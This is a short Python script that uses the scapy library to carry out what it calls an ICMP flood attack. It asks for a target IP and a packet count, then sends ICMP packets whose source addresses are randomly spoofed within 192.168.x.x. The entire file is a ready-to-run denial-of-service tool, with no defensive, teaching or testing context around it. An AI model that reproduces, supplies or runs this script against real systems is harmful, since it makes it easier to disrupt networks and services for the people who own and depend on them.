from scapy.all import *
import random

def icmp_flood(target_ip, packet_count):
    print(f"Starting ICMP flood attack on {target_ip}...")
    
    # Send the packets in a loop
    for i in range(packet_count):
        # Generate a random spoofed IP address in the range 192.168.0.1 to 192.168.255.254
        spoofed_ip = f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        # Craft the ICMP packet with the spoofed source IP
        packet = IP(dst=target_ip, src=spoofed_ip)/ICMP()
        
        # Send the packet
        send(packet, verbose=False)

    print(f"{packet_count} ICMP packets sent to {target_ip}")

if __name__ == "__main__":
    # Get user input for attack parameters
    target_ip = input("Enter the target IP address: ")
    packet_count = int(input("Enter the number of packets to send: "))
    
    # Run the ICMP flood attack with user-defined parameters
    icmp_flood(target_ip, packet_count)